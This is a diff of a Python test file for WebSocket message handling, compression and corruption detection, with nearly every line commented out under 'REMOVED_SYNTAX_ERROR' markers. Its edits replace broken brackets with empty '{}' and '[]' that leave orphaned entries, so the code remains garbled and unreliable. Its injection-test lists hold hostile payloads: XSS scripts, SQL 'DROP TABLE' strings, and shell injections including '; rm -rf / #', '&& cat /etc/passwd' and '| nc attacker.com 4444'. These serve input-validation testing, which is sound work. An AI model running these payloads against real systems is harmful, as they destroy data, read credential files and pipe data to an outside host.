     # REMOVED_SYNTAX_ERROR: "WebSocket message flow testing with compression validation. ",
@@ -1061,7 +1061,7 @@ queuedAt: Date.now()
 
 # REMOVED_SYNTAX_ERROR: def __init__(self):
     # REMOVED_SYNTAX_ERROR: pass
-    # REMOVED_SYNTAX_ERROR: self.corruption_detectors = { )
+    # REMOVED_SYNTAX_ERROR: self.corruption_detectors = {}
     # REMOVED_SYNTAX_ERROR: "truncation": self._detect_truncation,
     # REMOVED_SYNTAX_ERROR: "encoding": self._detect_encoding_corruption,
     # REMOVED_SYNTAX_ERROR: "malformed_json": self._create_malformed_json,
@@ -1079,7 +1079,7 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: """Test message truncation scenarios."""
     # REMOVED_SYNTAX_ERROR: if isinstance(message, str):
         # Truncate at various points
-        # REMOVED_SYNTAX_ERROR: return { )
+        # REMOVED_SYNTAX_ERROR: return {}
         # REMOVED_SYNTAX_ERROR: "original": message,
         # REMOVED_SYNTAX_ERROR: "truncated_50": message[:len(message)//2],
         # REMOVED_SYNTAX_ERROR: "truncated_90": message[:int(len(message)*0.9)],
@@ -1113,7 +1113,7 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: """Create malformed JSON variations."""
     # REMOVED_SYNTAX_ERROR: if isinstance(message, dict):
         # REMOVED_SYNTAX_ERROR: json_str = json.dumps(message)
-        # REMOVED_SYNTAX_ERROR: return { )
+        # REMOVED_SYNTAX_ERROR: return {}
         # REMOVED_SYNTAX_ERROR: "missing_quote": json_str.replace('"type"', 'type'),
         # REMOVED_SYNTAX_ERROR: "missing_comma": json_str.replace('", "', '" "'),
         # REMOVED_SYNTAX_ERROR: "unclosed_brace": json_str[:-1],
@@ -1124,7 +1124,7 @@ queuedAt: Date.now()
 
 # REMOVED_SYNTAX_ERROR: def _detect_injection_attempt(self, message: Any) -> Dict[str, Any]:
     # REMOVED_SYNTAX_ERROR: """Test various injection scenarios."""
-    # REMOVED_SYNTAX_ERROR: injection_payloads = { )
+    # REMOVED_SYNTAX_ERROR: injection_payloads = {}
     # REMOVED_SYNTAX_ERROR: "script_injection": "<script>alert('xss')</script>",
     # REMOVED_SYNTAX_ERROR: "sql_injection": ""; DROP TABLE messages; --",
     # REMOVED_SYNTAX_ERROR: "command_injection": "; rm -rf / #",
@@ -1153,7 +1153,7 @@ queuedAt: Date.now()
     # REMOVED_SYNTAX_ERROR: overflow_sizes = [1024*1024, 10*1024*1024, 100*1024*1024]  # 1MB, 10MB, 100MB
 
     # REMOVED_SYNTAX_ERROR: if isinstance(message, str):
-        # REMOVED_SYNTAX_ERROR: return { )
+        # REMOVED_SYNTAX_ERROR: return {}
         # REMOVED_SYNTAX_ERROR: "formatted_string": message + "A" * size
         # REMOVED_SYNTAX_ERROR: for size in overflow_sizes
         
@@ -1167,7 +1167,7 @@ queuedAt: Date.now()
 
 # REMOVED_SYNTAX_ERROR: def _create_xss_payload(self, message: Any) -> Dict[str, Any]:
     # REMOVED_SYNTAX_ERROR: """Create XSS test payloads."""
-    # REMOVED_SYNTAX_ERROR: xss_payloads = [ )
+    # REMOVED_SYNTAX_ERROR: xss_payloads = []
     # REMOVED_SYNTAX_ERROR: "<script>alert('xss')</script>",
     # REMOVED_SYNTAX_ERROR: "<img src=x onerror=alert('xss')>",
     # REMOVED_SYNTAX_ERROR: "javascript:alert('xss')",
@@ -1189,7 +1189,7 @@ queuedAt: Date.now()
 
 # REMOVED_SYNTAX_ERROR: def _create_sql_injection(self, message: Any) -> Dict[str, Any]:
     # REMOVED_SYNTAX_ERROR: """Create SQL injection test payloads."""
-    # REMOVED_SYNTAX_ERROR: sql_payloads = [ )
+    # REMOVED_SYNTAX_ERROR: sql_payloads = []
     # REMOVED_SYNTAX_ERROR: ""; DROP TABLE messages; --",
     # REMOVED_SYNTAX_ERROR: "" OR "1"="1" --",
     # REMOVED_SYNTAX_ERROR: ""; INSERT INTO logs VALUES ("injected"); --",
@@ -1215,7 +1215,7 @@ queuedAt: Date.now()
 
 # REMOVED_SYNTAX_ERROR: def _create_command_injection(self, message: Any) -> Dict[str, Any]:
     # REMOVED_SYNTAX_ERROR: """Create command injection test payloads."""
-    # REMOVED_SYNTAX_ERROR: cmd_payloads = [ )
+    # REMOVED_SYNTAX_ERROR: cmd_payloads = []
     # REMOVED_SYNTAX_ERROR: "; ls -la",
     # REMOVED_SYNTAX_ERROR: "&& cat /etc/passwd",
     # REMOVED_SYNTAX_ERROR: "| nc attacker.com 4444",
@@ -1545,7 +1545,7 @@ queuedAt: Date.now()
                                                                 # REMOVED_SYNTAX_ERROR: except Exception as e:
                                                                     # REMOVED_SYNTAX_ERROR: errors.append("formatted_string")
 
-                                                                    # REMOVED_SYNTAX_ERROR: return { )
+                                                                    # REMOVED_SYNTAX_ERROR: return {}
                                                                     # REMOVED_SYNTAX_ERROR: "transformations": transformations,
                                                                     # REMOVED_SYNTAX_ERROR: "errors": errors
                                                                     
@@ -1569,7 +1569,7 @@ queuedAt: Date.now()
         # Verify integrity
         # REMOVED_SYNTAX_ERROR: integrity_check = message == decompressed_message
 
-        # REMOVED_SYNTAX_ERROR: return { )
+        # REMOVED_SYNTAX_ERROR: return {}
         # REMOVED_SYNTAX_ERROR: "original_size": original_size,
         # REMOVED_SYNTAX_ERROR: "compressed_size": compressed_size,
         # REMOVED_SYNTAX_ERROR: "compression_ratio": compressed_size / original_size if original_size > 0 else 1.0,
@@ -1592,7 +1592,7 @@ queuedAt: Date.now()
             # successfully generated test cases without errors
             # REMOVED_SYNTAX_ERROR: detected = "error" not in corruption_result
 
-            # REMOVED_SYNTAX_ERROR: return { )
+            # REMOVED_SYNTAX_ERROR: return {}
             # REMOVED_SYNTAX_ERROR: "detected": detected,
             # REMOVED_SYNTAX_ERROR: "corruption_variants": len(corruption_result) if detected else 0,
             # REMOVED_SYNTAX_ERROR: "details": corruption_result
@@ -1620,7 +1620,7 @@ queuedAt: Date.now()
         # Verify integrity
         # REMOVED_SYNTAX_ERROR: integrity_check = message == retrieved_message
 
-        # REMOVED_SYNTAX_ERROR: return { )
+        # REMOVED_SYNTAX_ERROR: return {}
         # REMOVED_SYNTAX_ERROR: "success": integrity_check,
         # REMOVED_SYNTAX_ERROR: "message_id": message_id,
         # REMOVED_SYNTAX_ERROR: "storage_size": len(serialized_for_storage),
@@ -1677,7 +1677,7 @@ queuedAt: Date.now()
         # REMOVED_SYNTAX_ERROR: print("formatted_string")
         # REMOVED_SYNTAX_ERROR: print("formatted_string")
 
-        # REMOVED_SYNTAX_ERROR: print(" )
+        # REMOVED_SYNTAX_ERROR: print("")
         # REMOVED_SYNTAX_ERROR: Size Category Analysis:")
         # REMOVED_SYNTAX_ERROR: for category, stats in summary['size_category_analysis'].items():
             # REMOVED_SYNTAX_ERROR: success_rate = stats['successful'] / stats['total'] if stats['total'] > 0 else 0
